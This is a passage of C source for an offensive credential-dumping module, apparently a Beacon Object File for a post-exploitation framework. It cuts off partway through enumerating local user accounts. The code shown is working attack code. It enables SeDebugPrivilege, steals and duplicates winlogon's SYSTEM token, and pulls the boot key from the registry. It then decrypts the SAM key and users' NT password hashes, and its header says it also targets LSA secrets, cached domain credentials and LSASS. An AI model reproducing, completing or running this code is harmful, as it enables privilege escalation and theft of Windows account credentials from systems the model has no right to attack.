/*
 * hashdump.c — BOF: Dump SAM hashes, LSA Secrets, cached domain creds, LSASS.
 *
 * All operations in-memory. No disk writes. Requires SYSTEM privileges
 * (auto-escalates from admin via winlogon token steal).
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c -Os -fno-asynchronous-unwind-tables \
 *     -fno-ident -fpack-struct=8 -I../../../shared/include \
 *     -o ../bin/hashdump.x64.o hashdump.c
 */

#include <windows.h>
#include <winternl.h>
#include "beacon_compat.h"

/* ═══════════════════════════════════════════════════════════════════
 *  BOF DLL function imports
 * ═══════════════════════════════════════════════════════════════════ */

/* --- KERNEL32 --- */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapReAlloc(HANDLE, DWORD, LPVOID, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);

/* --- ADVAPI32 --- */
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegQueryInfoKeyW(HKEY, LPWSTR, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegEnumKeyExW(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);

/* --- NTDLL --- */
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

/* --- BCRYPT --- */
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(PVOID*, LPCWSTR, LPCWSTR, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(PVOID, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptSetProperty(PVOID, LPCWSTR, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptGenerateSymmetricKey(PVOID, PVOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptDecrypt(PVOID, PUCHAR, ULONG, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, PULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptDestroyKey(PVOID);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptCreateHash(PVOID, PVOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptHashData(PVOID, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptFinishHash(PVOID, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptDestroyHash(PVOID);

/* --- MSVCRT --- */
DECLSPEC_IMPORT void*  WINAPI MSVCRT$calloc(size_t, size_t);
DECLSPEC_IMPORT void   WINAPI MSVCRT$free(void*);
DECLSPEC_IMPORT void*  WINAPI MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void*  WINAPI MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int    WINAPI MSVCRT$memcmp(const void*, const void*, size_t);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT int    WINAPI MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT int    WINAPI MSVCRT$swprintf(wchar_t*, const wchar_t*, ...);
DECLSPEC_IMPORT long   WINAPI MSVCRT$wcstol(const wchar_t*, wchar_t**, int);

/* ═══════════════════════════════════════════════════════════════════
 *  Constants & helpers
 * ═══════════════════════════════════════════════════════════════════ */

#define STATUS_SUCCESS 0
#define HEAP_ZERO  HEAP_ZERO_MEMORY
#define SystemProcessInformation 5

/* Heap wrappers */
static void *_alloc(SIZE_T sz) {
    return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO, sz);
}
static void _free(void *p) {
    if (p) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p);
}

/* Hex formatting */
static void _hex(const unsigned char *data, int len, char *out) {
    static const char h[] = "0123456789abcdef";
    for (int i = 0; i < len; i++) {
        out[i*2]   = h[data[i] >> 4];
        out[i*2+1] = h[data[i] & 0xF];
    }
    out[len*2] = 0;
}

/* Wide hex string to bytes: L"0a1b2c" → {0x0a, 0x1b, 0x2c} */
static int _whex2bin(const wchar_t *hex, unsigned char *out, int maxLen) {
    int len = 0;
    while (*hex && *(hex+1) && len < maxLen) {
        unsigned char hi, lo;
        wchar_t c = *hex++;
        if (c >= L'0' && c <= L'9') hi = (unsigned char)(c - L'0');
        else if (c >= L'a' && c <= L'f') hi = (unsigned char)(c - L'a' + 10);
        else if (c >= L'A' && c <= L'F') hi = (unsigned char)(c - L'A' + 10);
        else { hex++; continue; }  /* skip both chars of invalid pair */
        c = *hex++;
        if (c >= L'0' && c <= L'9') lo = (unsigned char)(c - L'0');
        else if (c >= L'a' && c <= L'f') lo = (unsigned char)(c - L'a' + 10);
        else if (c >= L'A' && c <= L'F') lo = (unsigned char)(c - L'A' + 10);
        else continue;  /* lo invalid — skip this byte */
        out[len++] = (hi << 4) | lo;
    }
    return len;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Crypto helpers using BCrypt
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL _aes_decrypt_cbc(const unsigned char *key, int keyLen,
                              const unsigned char *iv, int ivLen,
                              const unsigned char *data, int dataLen,
                              unsigned char *out, int *outLen) {
    PVOID hAlg = NULL, hKey = NULL;
    BOOL ok = FALSE;
    ULONG cbResult = 0;

    if (BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, L"AES", NULL, 0) != 0) return FALSE;
    if (BCRYPT$BCryptSetProperty(hAlg, L"ChainingMode", (PUCHAR)L"ChainingModeCBC",
                                  sizeof(L"ChainingModeCBC"), 0) != 0) goto done;
    if (BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                           (PUCHAR)key, keyLen, 0) != 0) goto done;

    /* Copy IV since BCrypt modifies it in-place */
    unsigned char ivCopy[16];
    MSVCRT$memcpy(ivCopy, iv, ivLen > 16 ? 16 : ivLen);

    NTSTATUS st = BCRYPT$BCryptDecrypt(hKey, (PUCHAR)data, dataLen, NULL,
                                        ivCopy, ivLen > 16 ? 16 : ivLen,
                                        out, dataLen, &cbResult, 0);
    if (st == 0) {
        *outLen = (int)cbResult;
        ok = TRUE;
    }
done:
    if (hKey) BCRYPT$BCryptDestroyKey(hKey);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

static BOOL _des_ecb_decrypt(const unsigned char *key8, const unsigned char *data8, unsigned char *out8) {
    PVOID hAlg = NULL, hKey = NULL;
    BOOL ok = FALSE;
    ULONG cbResult = 0;

    if (BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, L"DES", NULL, 0) != 0) return FALSE;
    if (BCRYPT$BCryptSetProperty(hAlg, L"ChainingMode", (PUCHAR)L"ChainingModeECB",
                                  sizeof(L"ChainingModeECB"), 0) != 0) goto done;
    if (BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                           (PUCHAR)key8, 8, 0) != 0) goto done;

    if (BCRYPT$BCryptDecrypt(hKey, (PUCHAR)data8, 8, NULL,
                              NULL, 0, out8, 8, &cbResult, 0) == 0)
        ok = TRUE;
done:
    if (hKey) BCRYPT$BCryptDestroyKey(hKey);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

static BOOL _md5(const unsigned char *data, int dataLen, unsigned char *hash16) {
    PVOID hAlg = NULL, hHash = NULL;
    BOOL ok = FALSE;
    if (BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, L"MD5", NULL, 0) != 0) return FALSE;
    if (BCRYPT$BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) goto done;
    if (BCRYPT$BCryptHashData(hHash, (PUCHAR)data, dataLen, 0) != 0) goto done;
    if (BCRYPT$BCryptFinishHash(hHash, hash16, 16, 0) == 0) ok = TRUE;
done:
    if (hHash) BCRYPT$BCryptDestroyHash(hHash);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

static BOOL _sha256(const unsigned char *data, int dataLen, unsigned char *hash32) {
    PVOID hAlg = NULL, hHash = NULL;
    BOOL ok = FALSE;
    if (BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, L"SHA256", NULL, 0) != 0) return FALSE;
    if (BCRYPT$BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) goto done;
    if (BCRYPT$BCryptHashData(hHash, (PUCHAR)data, dataLen, 0) != 0) goto done;
    if (BCRYPT$BCryptFinishHash(hHash, hash32, 32, 0) == 0) ok = TRUE;
done:
    if (hHash) BCRYPT$BCryptDestroyHash(hHash);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* SHA256( key || salt repeated 1000x ) — used by LSA decryption */
static BOOL _sha256_salted(const unsigned char *key, int keyLen,
                            const unsigned char *salt, int saltLen,
                            unsigned char *hash32) {
    PVOID hAlg = NULL, hHash = NULL;
    BOOL ok = FALSE;
    if (BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, L"SHA256", NULL, 0) != 0) return FALSE;
    if (BCRYPT$BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) goto done;
    if (BCRYPT$BCryptHashData(hHash, (PUCHAR)key, keyLen, 0) != 0) goto done;
    for (int i = 0; i < 1000; i++) {
        if (BCRYPT$BCryptHashData(hHash, (PUCHAR)salt, saltLen, 0) != 0) goto done;
    }
    if (BCRYPT$BCryptFinishHash(hHash, hash32, 32, 0) == 0) ok = TRUE;
done:
    if (hHash) BCRYPT$BCryptDestroyHash(hHash);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* RC4 via SystemFunction032 (advapi32, undocumented but stable) */
typedef struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } USTRING;
typedef NTSTATUS (WINAPI *pSystemFunction032)(USTRING *data, USTRING *key);

static BOOL _rc4(unsigned char *data, int dataLen,
                  const unsigned char *key, int keyLen) {
    HMODULE hAdv = KERNEL32$GetModuleHandleA("advapi32.dll");
    if (!hAdv) hAdv = KERNEL32$LoadLibraryA("advapi32.dll");
    if (!hAdv) return FALSE;
    pSystemFunction032 fn = (pSystemFunction032)KERNEL32$GetProcAddress(hAdv, "SystemFunction032");
    if (!fn) return FALSE;
    USTRING d = { (ULONG)dataLen, (ULONG)dataLen, data };
    USTRING k = { (ULONG)keyLen,  (ULONG)keyLen,  (PUCHAR)key };
    return fn(&d, &k) == 0;
}

/* ═══════════════════════════════════════════════════════════════════
 *  RID → DES key derivation
 * ═══════════════════════════════════════════════════════════════════ */

/* Expand 7 bytes → 8-byte DES key with parity bits */
static void _str_to_key(const unsigned char *s, unsigned char *key8) {
    key8[0] = (s[0] >> 1);
    key8[1] = ((s[0] & 0x01) << 6) | (s[1] >> 2);
    key8[2] = ((s[1] & 0x03) << 5) | (s[2] >> 3);
    key8[3] = ((s[2] & 0x07) << 4) | (s[3] >> 4);
    key8[4] = ((s[3] & 0x0F) << 3) | (s[4] >> 5);
    key8[5] = ((s[4] & 0x1F) << 2) | (s[5] >> 6);
    key8[6] = ((s[5] & 0x3F) << 1) | (s[6] >> 7);
    key8[7] = (s[6] & 0x7F);
    for (int i = 0; i < 8; i++)
        key8[i] = (key8[i] << 1) & 0xFE;
}

/* Derive two 8-byte DES keys from a 4-byte RID */
static void _rid_to_keys(DWORD rid, unsigned char *k1, unsigned char *k2) {
    unsigned char s[7];
    s[0] = (unsigned char)(rid & 0xFF);
    s[1] = (unsigned char)((rid >> 8) & 0xFF);
    s[2] = (unsigned char)((rid >> 16) & 0xFF);
    s[3] = (unsigned char)((rid >> 24) & 0xFF);
    s[4] = s[0]; s[5] = s[1]; s[6] = s[2];
    _str_to_key(s, k1);

    s[0] = (unsigned char)((rid >> 24) & 0xFF);
    s[1] = (unsigned char)(rid & 0xFF);
    s[2] = (unsigned char)((rid >> 8) & 0xFF);
    s[3] = (unsigned char)((rid >> 16) & 0xFF);
    s[4] = s[0]; s[5] = s[1]; s[6] = s[2];
    _str_to_key(s, k2);
}

/* ═══════════════════════════════════════════════════════════════════
 *  SYSTEM token impersonation
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL _enable_privilege(HANDLE hToken, LPCWSTR privName) {
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!ADVAPI32$LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid))
        return FALSE;
    return ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

static BOOL _is_system(void) {
    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    DWORD len = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
    unsigned char *buf = (unsigned char *)_alloc(len);
    if (!buf) { KERNEL32$CloseHandle(hToken); return FALSE; }
    BOOL ok = FALSE;
    if (ADVAPI32$GetTokenInformation(hToken, TokenUser, buf, len, &len)) {
        TOKEN_USER *tu = (TOKEN_USER *)buf;
        SID *sid = (SID *)tu->User.Sid;
        /* S-1-5-18 = SYSTEM */
        if (sid->SubAuthorityCount == 1 && sid->SubAuthority[0] == 18)
            ok = TRUE;
    }
    _free(buf);
    KERNEL32$CloseHandle(hToken);
    return ok;
}

/* Find PID of a SYSTEM process (winlogon.exe) */
static DWORD _find_system_pid(void) {
    ULONG bufSize = 1024 * 256;
    unsigned char *buf = (unsigned char *)_alloc(bufSize);
    if (!buf) return 0;

    ULONG retLen = 0;
    NTSTATUS st = NTDLL$NtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &retLen);
    if (st != 0) {
        _free(buf);
        bufSize = retLen + 4096;
        buf = (unsigned char *)_alloc(bufSize);
        if (!buf) return 0;
        st = NTDLL$NtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &retLen);
        if (st != 0) { _free(buf); return 0; }
    }

    DWORD pid = 0;
    unsigned char *ptr = buf;
    while (1) {
        DWORD nextOff = *(DWORD *)ptr;
        /* UNICODE_STRING ImageName at offset 0x38 (x64) */
        USHORT nameLen = *(USHORT *)(ptr + 0x38);
        PWSTR  nameBuf = *(PWSTR *)(ptr + 0x38 + sizeof(USHORT) + sizeof(USHORT) + sizeof(ULONG));
        /* Some Windows versions: offset to buffer pointer differs. Use portable approach. */
        UNICODE_STRING *imgName = (UNICODE_STRING *)(ptr + 0x38);
        if (imgName->Length > 0 && imgName->Buffer) {
            int wlen = imgName->Length / 2;
            /* Compare last part of name for "winlogon.exe" */
            if (wlen >= 12) {
                wchar_t *p = imgName->Buffer + wlen - 12;
                if ((p[0] == L'w' || p[0] == L'W') &&
                    (p[1] == L'i' || p[1] == L'I') &&
                    (p[2] == L'n' || p[2] == L'N') &&
                    (p[3] == L'l' || p[3] == L'L') &&
                    (p[4] == L'o' || p[4] == L'O') &&
                    (p[5] == L'g' || p[5] == L'G') &&
                    (p[6] == L'o' || p[6] == L'O') &&
                    (p[7] == L'n' || p[7] == L'N') &&
                    p[8] == L'.' &&
                    (p[9] == L'e' || p[9] == L'E') &&
                    (p[10] == L'x' || p[10] == L'X') &&
                    (p[11] == L'e' || p[11] == L'E')) {
                    /* UniqueProcessId at offset 0x48 (x64) */
                    pid = (DWORD)(*(ULONG_PTR *)(ptr + 0x48));
                    break;
                }
            }
        }
        if (nextOff == 0) break;
        ptr += nextOff;
    }
    _free(buf);
    return pid;
}

static HANDLE _steal_system_token(void) {
    /* Enable SeDebugPrivilege */
    HANDLE hSelfToken = NULL;
    ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                               TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelfToken);
    if (hSelfToken) {
        _enable_privilege(hSelfToken, L"SeDebugPrivilege");
        KERNEL32$CloseHandle(hSelfToken);
    }

    DWORD pid = _find_system_pid();
    if (pid == 0) return NULL;

    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return NULL;

    HANDLE hToken = NULL, hDup = NULL;
    if (ADVAPI32$OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                                   SecurityImpersonation, TokenImpersonation, &hDup);
        KERNEL32$CloseHandle(hToken);
    }
    KERNEL32$CloseHandle(hProc);
    return hDup;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Boot key (syskey) extraction from SYSTEM hive
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL _get_boot_key(unsigned char *bootKey) {
    /* Determine CurrentControlSet */
    HKEY hSelect = NULL;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\Select",
                                0, KEY_READ, &hSelect) != 0)
        return FALSE;

    DWORD current = 0, cbData = sizeof(current);
    ADVAPI32$RegQueryValueExW(hSelect, L"Current", NULL, NULL, (LPBYTE)&current, &cbData);
    ADVAPI32$RegCloseKey(hSelect);
    if (current == 0) current = 1;

    wchar_t lsaPath[128];
    MSVCRT$swprintf(lsaPath, L"SYSTEM\\ControlSet%03d\\Control\\Lsa", current);

    /* Read class names from JD, Skew1, GBG, Data subkeys */
    const wchar_t *subkeys[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    unsigned char scrambled[16];
    int scrambledOff = 0;

    for (int i = 0; i < 4; i++) {
        wchar_t fullPath[256];
        MSVCRT$swprintf(fullPath, L"%s\\%s", lsaPath, subkeys[i]);

        HKEY hKey = NULL;
        if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, fullPath, 0, KEY_READ, &hKey) != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open SYSTEM\\...\\Lsa\\%S", subkeys[i]);
            return FALSE;
        }

        wchar_t className[32] = {0};
        DWORD classLen = 32;
        ADVAPI32$RegQueryInfoKeyW(hKey, className, &classLen, NULL, NULL, NULL,
                                   NULL, NULL, NULL, NULL, NULL, NULL);
        ADVAPI32$RegCloseKey(hKey);

        int n = _whex2bin(className, scrambled + scrambledOff, 4);
        scrambledOff += n;
    }

    if (scrambledOff != 16) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Boot key extraction failed: got %d bytes", scrambledOff);
        return FALSE;
    }

    /* Descramble permutation */
    static const int perm[] = {8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7};
    for (int i = 0; i < 16; i++)
        bootKey[i] = scrambled[perm[i]];

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  SAM hash extraction
 * ═══════════════════════════════════════════════════════════════════ */

static const unsigned char SAM_QWERTY[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0";
static const unsigned char SAM_NUMERIC[] = "0123456789012345678901234567890123456789\0";
static const unsigned char SAM_AQWERTY[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
static const unsigned char SAM_ANUM[] = "0123456789012345678901234567890123456789";

/* Empty NT hash (user with no password) */
static const unsigned char EMPTY_NT[] = {0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,
                                          0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0};
static const unsigned char EMPTY_LM[] = {0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,
                                          0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee};

static BOOL _get_sam_key(const unsigned char *bootKey, const unsigned char *fValue,
                          DWORD fLen, unsigned char *samKey) {
    if (fLen < 0xA0) return FALSE;

    DWORD revision = *(DWORD *)(fValue + 0x00);

    if (revision == 3) {
        /* AES-based (Vista+): salt at 0x78, encrypted key at 0x88 */
        const unsigned char *salt = fValue + 0x78;
        const unsigned char *encData = fValue + 0x88;
        int encLen = fLen - 0x88;
        if (encLen < 32) return FALSE;

        unsigned char decrypted[64];
        int decLen = 0;
        if (!_aes_decrypt_cbc(bootKey, 16, salt, 16, encData, encLen > 64 ? 64 : encLen, decrypted, &decLen))
            return FALSE;
        MSVCRT$memcpy(samKey, decrypted, 16);
        return TRUE;
    }
    else if (revision == 2) {
        /* RC4-based (legacy): salt at 0x70, encrypted key at 0x80 */
        const unsigned char *salt = fValue + 0x70;
        const unsigned char *encData = fValue + 0x80;

        /* key = MD5(salt + AQWERTY + bootkey + ANUM) */
        int mdBufLen = 16 + 48 + 16 + 40;
        unsigned char *mdBuf = (unsigned char *)_alloc(mdBufLen);
        if (!mdBuf) return FALSE;
        int off = 0;
        MSVCRT$memcpy(mdBuf + off, salt, 16); off += 16;
        MSVCRT$memcpy(mdBuf + off, SAM_AQWERTY, 48); off += 48;
        MSVCRT$memcpy(mdBuf + off, bootKey, 16); off += 16;
        MSVCRT$memcpy(mdBuf + off, SAM_ANUM, 40); off += 40;

        unsigned char md5Key[16];
        if (!_md5(mdBuf, mdBufLen, md5Key)) { _free(mdBuf); return FALSE; }
        _free(mdBuf);

        unsigned char rc4Buf[32];
        MSVCRT$memcpy(rc4Buf, encData, 32);
        if (!_rc4(rc4Buf, 32, md5Key, 16)) return FALSE;
        MSVCRT$memcpy(samKey, rc4Buf, 16);
        return TRUE;
    }

    return FALSE;
}

/* Decrypt a single user hash (NT or LM) from V value data */
static BOOL _decrypt_sam_hash(const unsigned char *samKey, DWORD rid,
                               const unsigned char *hashData, int hashLen,
                               unsigned char *hashOut) {
    if (hashLen < 4) {
        /* No hash data — return empty hash */
        MSVCRT$memcpy(hashOut, EMPTY_NT, 16);
        return TRUE;
    }

    WORD revision = *(WORD *)(hashData + 2);

    unsigned char decrypted[32];

    if (revision == 2) {
        /* AES: salt at +4 (16 bytes), encrypted hash at +20 */
        if (hashLen < 36) { MSVCRT$memcpy(hashOut, EMPTY_NT, 16); return TRUE; }
        const unsigned char *salt = hashData + 4;
        const unsigned char *encHash = hashData + 20;
        int encLen = hashLen - 20;
        int decLen = 0;
        if (!_aes_decrypt_cbc(samKey, 16, salt, 16, encHash,
                               encLen > 32 ? 32 : encLen, decrypted, &decLen))
            return FALSE;
    }
    else if (revision == 1) {
        /* RC4 + DES */
        if (hashLen < 20) { MSVCRT$memcpy(hashOut, EMPTY_NT, 16); return TRUE; }
        const unsigned char *encHash = hashData + 4;

        /* RC4 key = MD5(samKey + RID + constant) */
        /* For NT: constant = SAM_QWERTY
         * For LM: constant = SAM_NUMERIC (but we don't distinguish here,
         *          caller should call twice with appropriate constants) */
        unsigned char ridBytes[4];
        ridBytes[0] = (unsigned char)(rid & 0xFF);
        ridBytes[1] = (unsigned char)((rid >> 8) & 0xFF);
        ridBytes[2] = (unsigned char)((rid >> 16) & 0xFF);
        ridBytes[3] = (unsigned char)((rid >> 24) & 0xFF);

        /* Use QWERTY constant for NT hash (this is the common case) */
        unsigned char mdBuf[16 + 4 + 48];
        MSVCRT$memcpy(mdBuf, samKey, 16);
        MSVCRT$memcpy(mdBuf + 16, ridBytes, 4);
        MSVCRT$memcpy(mdBuf + 20, SAM_QWERTY, 48);

        unsigned char rc4Key[16];
        if (!_md5(mdBuf, 16 + 4 + 48, rc4Key)) return FALSE;

        MSVCRT$memcpy(decrypted, encHash, 16);
        if (!_rc4(decrypted, 16, rc4Key, 16)) return FALSE;
    }
    else {
        MSVCRT$memcpy(hashOut, EMPTY_NT, 16);
        return TRUE;
    }

    /* RID-based DES decryption (always applied after AES/RC4 layer) */
    unsigned char desKey1[8], desKey2[8];
    _rid_to_keys(rid, desKey1, desKey2);

    unsigned char des1Out[8], des2Out[8];
    if (!_des_ecb_decrypt(desKey1, decrypted, des1Out)) return FALSE;
    if (!_des_ecb_decrypt(desKey2, decrypted + 8, des2Out)) return FALSE;

    MSVCRT$memcpy(hashOut, des1Out, 8);
    MSVCRT$memcpy(hashOut + 8, des2Out, 8);
    return TRUE;
}

static void _dump_sam(const unsigned char *bootKey) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] ======== SAM Hashes ========\n");

    /* Get the SAM key from SAM\Domains\Account\F */
    HKEY hAccount = NULL;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SAM\\SAM\\Domains\\Account", 0, KEY_READ, &hAccount) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SAM: Failed to open SAM\\Domains\\Account (need SYSTEM)");
        return;
    }

    DWORD fLen = 0;
    ADVAPI32$RegQueryValueExW(hAccount, L"F", NULL, NULL, NULL, &fLen);
    if (fLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SAM: F value not found or empty");
        ADVAPI32$RegCloseKey(hAccount);
        return;
    }

    unsigned char *fValue = (unsigned char *)_alloc(fLen);
    if (!fValue) { ADVAPI32$RegCloseKey(hAccount); return; }
    ADVAPI32$RegQueryValueExW(hAccount, L"F", NULL, NULL, fValue, &fLen);

    unsigned char samKey[16];
    if (!_get_sam_key(bootKey, fValue, fLen, samKey)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SAM: Failed to derive SAM key");
        _free(fValue);
        ADVAPI32$RegCloseKey(hAccount);
        return;
    }
    _free(fValue);

    /* Enumerate users under SAM\Domains\Account\Users */
    HKEY hUsers = NULL;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SAM\\SAM\\Domains\\Account\\Users", 0, KEY_READ, &hUsers) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SAM: Failed to open Users key");
        ADVAPI32$RegCloseKey(hAccount);
        return;
    }

    int userCount = 0;
    wchar_t subKeyName[64];
    DWORD subKeyLen;

    for (DWORD idx = 0; ; idx++) {
        subKeyLen = 64;
        if (ADVAPI32$RegEnumKeyExW(hUsers, idx, subKeyName, &subKeyLen,
                                    NULL, NULL, NULL, NULL) != 0)
            break;

        /* Skip "Names" subkey */
        if (subKeyName[0] == L'N' || subKeyName[0] == L'n') continue;

        /* Parse RID from hex subkey name (e.g., "000001F4" = 500) */
        DWORD rid = (DWORD)MSVCRT$wcstol(subKeyName, NULL, 16);
        if (rid == 0) continue;

        /* Open user subkey and read V value */
        HKEY hUser = NULL;
        wchar_t userPath[128];
        MSVCRT$swprintf(userPath, L"SAM\\SAM\\Domains\\Account\\Users\\%s", subKeyName);
        if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, userPath, 0, KEY_READ, &hUser) != 0)
            continue;

        DWORD vLen = 0;
        ADVAPI32$RegQueryValueExW(hUser, L"V", NULL, NULL, NULL, &vLen);
        if (vLen < 0xCC + 16) {
            ADVAPI32$RegCloseKey(hUser);
            continue;
        }

        unsigned char *vValue = (unsigned char *)_alloc(vLen);
        if (!vValue) { ADVAPI32$RegCloseKey(hUser); continue; }
